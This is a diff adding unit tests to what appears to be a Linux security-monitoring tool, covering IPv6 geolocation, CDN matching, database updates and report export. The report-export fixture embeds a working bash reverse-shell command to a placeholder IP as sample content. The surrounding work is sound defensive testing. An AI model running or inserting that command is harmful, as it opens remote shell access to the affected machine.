@@ -11,9 +11,19 @@ sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from unittest import mock
 
 from modules.ai_analyzer import redact_text, AIAnalyzer
-from modules.geo_locator import classify_port, is_private_ip, is_valid_public_ip
+from modules.geo_locator import (
+    classify_port, is_private_ip, is_valid_public_ip,
+    Zxipv6wryReader, CdnMatcher, GeoLocator, find_ipv6_db, find_cdn_yaml,
+)
 from modules.net_monitor import _assess_connection_risk, configure_geo_risk
 from modules.proc_monitor import _detect_high_risk, _exe_is_deleted
+from modules.report_exporter import export_markdown, export_pdf
+
+# 测试用样本库（由 ip.7z 提取的 ipv6wry.db 与 cdn.yml）
+_SAMPLE_IPV6 = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
+                            'data', 'ipv6wry.db')
+_SAMPLE_CDN = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
+                           'data', 'cdn.yml')
 
 
 class TestRedact(unittest.TestCase):
@@ -204,6 +214,132 @@ class TestMalwareDetection(unittest.TestCase):
         p = self._base(name='nginx', exe='/usr/sbin/nginx', username='www-data')
         risky, level, reasons = _detect_high_risk(p)
         self.assertFalse(risky)
+
+
+@unittest.skipUnless(os.path.isfile(_SAMPLE_IPV6), '需要 data/ipv6wry.db (运行 linmon update)')
+class TestIpv6Lookup(unittest.TestCase):
+    def test_reader_loads_and_resolves(self):
+        r = Zxipv6wryReader(_SAMPLE_IPV6)
+        r.load()
+        self.assertEqual(r._img[:4], b'IPDB')
+        self.assertEqual(r._iplen, 8)
+        # 阿里云 IPv6 段
+        c, a = r.lookup('2408:400a:10::')
+        self.assertTrue(c or a)
+        # 本地/保留地址有记录
+        self.assertIsInstance(r.lookup('fe80::1'), tuple)
+
+    def test_v4_rejected(self):
+        r = Zxipv6wryReader(_SAMPLE_IPV6)
+        r.load()
+        self.assertEqual(r.lookup('8.8.8.8'), ('', ''))
+
+
+@unittest.skipUnless(os.path.isfile(_SAMPLE_CDN), '需要 data/cdn.yml (运行 linmon update)')
+class TestCdnMatcher(unittest.TestCase):
+    def test_load_and_suffix_match(self):
+        cm = CdnMatcher()
+        self.assertTrue(cm.load(_SAMPLE_CDN))
+        self.assertIsNotNone(cm.lookup('a.b.akamai.net'))
+        self.assertEqual(cm.lookup('a.b.akamai.net')['provider'], 'Akamai CDN')
+        # cloudflare.net 命中，cloudflare.com 不命中（数据集中无该键）
+        self.assertIsNotNone(cm.lookup('www.cloudflare.net'))
+        self.assertIsNone(cm.lookup('www.cloudflare.com'))
+        self.assertIsNone(cm.lookup('example.com'))
+
+    def test_longest_suffix_wins(self):
+        cm = CdnMatcher()
+        cm.load(_SAMPLE_CDN)
+        # 同时匹配多级后缀时取最长
+        r = cm.lookup('img.360cdn.com')
+        self.assertEqual(r['provider'], '360 云 CDN (由奇虎 360 运营)')
+
+
+@unittest.skipUnless(os.path.isfile(_SAMPLE_IPV6) and os.path.isfile(_SAMPLE_CDN),
+                     '需要 data/ipv6wry.db 与 data/cdn.yml (运行 linmon update)')
+class TestGeoLocatorV6Cdn(unittest.TestCase):
+    def tearDown(self):
+        GeoLocator.close()
+
+    def test_ipv6_lookup_enriched(self):
+        g = GeoLocator.lookup_ip('2606:4700:4700::1111')
+        self.assertTrue(g['geo_str'])
+        self.assertIsNone(g.get('cdn'))  # 未提供主机名时无 CDN
+
+    def test_ipv6_with_hostname_cdn(self):
+        g = GeoLocator.lookup_ip('2606:4700:4700::1111', hostname='www.cloudflare.net')
+        self.assertIsNotNone(g.get('cdn'))
+        self.assertEqual(g['cdn']['provider'], 'Cloudflare')
+
+    def test_ipv4_with_hostname_cdn(self):
+        g = GeoLocator.lookup_ip('23.45.67.89', hostname='a.b.akamai.net')
+        self.assertIsNotNone(g.get('cdn'))
+        self.assertEqual(g['cdn']['provider'], 'Akamai CDN')
+
+
+class TestDbUpdater(unittest.TestCase):
+    def test_valid_db_set(self):
+        from modules.db_updater import VALID_DB
+        self.assertEqual(VALID_DB, {'qqwry', 'cdn', 'zxipv6wry'})
+
+    def test_update_cdn_writes_file(self):
+        from modules.db_updater import update_cdn
+        import tempfile, shutil as _shutil
+        tmp = tempfile.mkdtemp()
+        sample = os.path.join(tmp, 'sample_cdn.yml')
+        with open(sample, 'w', encoding='utf-8') as f:
+            f.write('example-cdn.com:\n  name: 测试CDN\n  link: https://x\n')
+        dest = os.path.join(tmp, 'cdn.yml')
+        # 模拟下载：把样本复制为目标文件
+        def _fake_download(url, d, timeout=60):
+            _shutil.copyfile(sample, d)
+            return True
+        with mock.patch('modules.db_updater._http_download', side_effect=_fake_download), \
+                mock.patch('modules.db_updater.CDN_URLS', [sample]):
+            ok = update_cdn(data_dir=tmp)
+        self.assertTrue(ok)
+        self.assertTrue(os.path.isfile(dest))
+        os.remove(dest)
+        os.remove(sample)
+        os.rmdir(tmp)
+
+
+class TestReportExporter(unittest.TestCase):
+    def _sample(self):
+        return {
+            'title': 'AI 综合安全报告',
+            'timestamp': '2026-08-23 12:00:00',
+            'target_type': 'overview',
+            'target': '系统综合安全报告',
+            'analysis': (
+                '# 总体安全评估\n'
+                '系统存在**中风险**项，需关注。\n\n'
+                '## 高危项目清单\n'
+                '1. 发现可疑进程 `xmrig`\n'
+                '- 外连至境外 IP\n'
+                '- 命中矿池特征\n\n'
+                '```\n'
+                'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n'
+                '```\n\n'
+                '> 建议立即隔离并排查。\n\n'
+                '---\n\n'
+                '## 处置建议\n'
+                '按优先级排序处理。'
+            ),
+        }
+
+    def test_export_markdown(self):
+        md = export_markdown(self._sample())
+        self.assertIn('# AI 综合安全报告', md)
+        self.assertIn('生成时间: 2026-08-23 12:00:00', md)
+        self.assertIn('发现可疑进程', md)
+
+    def test_export_pdf_is_valid(self):
+        pdf = export_pdf(self._sample())
+        self.assertIsInstance(pdf, bytes)
+        self.assertTrue(pdf.startswith(b'%PDF'))
+        # 中文/标题/列表/代码块都能进入 PDF 而不抛异常
+        self.assertGreater(len(pdf), 500)
 
 
 if __name__ == '__main__':
